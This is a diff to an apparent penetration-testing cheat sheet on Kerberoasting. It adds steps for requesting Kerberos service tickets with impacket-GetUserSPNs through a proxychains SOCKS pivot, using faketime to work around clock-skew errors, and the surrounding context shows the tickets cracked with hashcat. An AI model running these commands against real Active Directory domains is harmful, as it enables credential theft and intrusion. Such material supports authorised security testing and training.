@@ -28,6 +28,15 @@ impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-use
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
+Over a **pivot** (Kali reaches the DC only through a SOCKS proxy) — wrap in proxychains. If you hit
+`KRB_AP_ERR_SKEW` and can't `ntpdate` the DC through the proxy, read the DC's clock and run under `faketime`:
+
+```bash
+proxychains -q impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
+proxychains net time -S {{DC_IP}}                                                        # read the DC clock
+faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
+```
+
 ### From Windows — Rubeus (easy button)
 
 ```powershell
